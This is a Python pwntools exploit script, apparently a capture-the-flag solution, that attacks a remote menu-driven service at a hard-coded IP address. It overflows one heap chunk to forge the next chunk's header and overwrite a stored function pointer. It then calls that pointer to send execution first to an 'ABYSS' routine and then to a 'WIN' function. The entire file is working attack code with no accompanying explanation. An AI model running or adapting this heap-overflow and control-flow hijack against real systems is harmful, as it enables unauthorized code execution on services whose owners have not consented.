from pwn import *

context.log_level = "error"

HOST = "103.127.98.249"
PORT = 5001

ABYSS = 0x4012D8
WIN = 0x4011D6


def connect():
    return remote(HOST, PORT)


def build_object(func, data=0x4141414141414141, size=0x20, active=1):
    return (
        p64(func)
        + p64(data)
        + p32(size)
        + p32(active)
    )


def select(io, option):
    io.sendlineafter(b">> ", str(option).encode())


def allocate(io, index, size, content):
    select(io, 1)
    io.sendlineafter(b"Index (0-9): ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", content)


def edit(io, index, content):
    select(io, 2)
    io.sendlineafter(b"Index (0-9): ", str(index).encode())
    io.sendafter(b"Data: ", content)


def execute(io, index):
    select(io, 3)
    io.sendlineafter(b"Index (0-9): ", str(index).encode())


def forge_chunk(target):
    payload = (
        b"A" * 0x20
        + p64(0)
        + p64(0x21)
        + build_object(target)
    )

    return payload.ljust(0x50, b"P")


def trigger(io, target):
    edit(io, 0, forge_chunk(target))
    execute(io, 1)


def main():
    io = connect()

    allocate(io, 0, 0x20, b"X" * 0x20)
    allocate(io, 1, 0x20, b"Y" * 0x20)

    trigger(io, ABYSS)

    io.sendlineafter(b"Size of payload: ", b"0")
    io.recvuntil(b"Payload processed successfully")

    trigger(io, WIN)

    print(io.recvrepeat(1).decode("latin-1", "ignore"))

    io.close()


if __name__ == "__main__":
    main()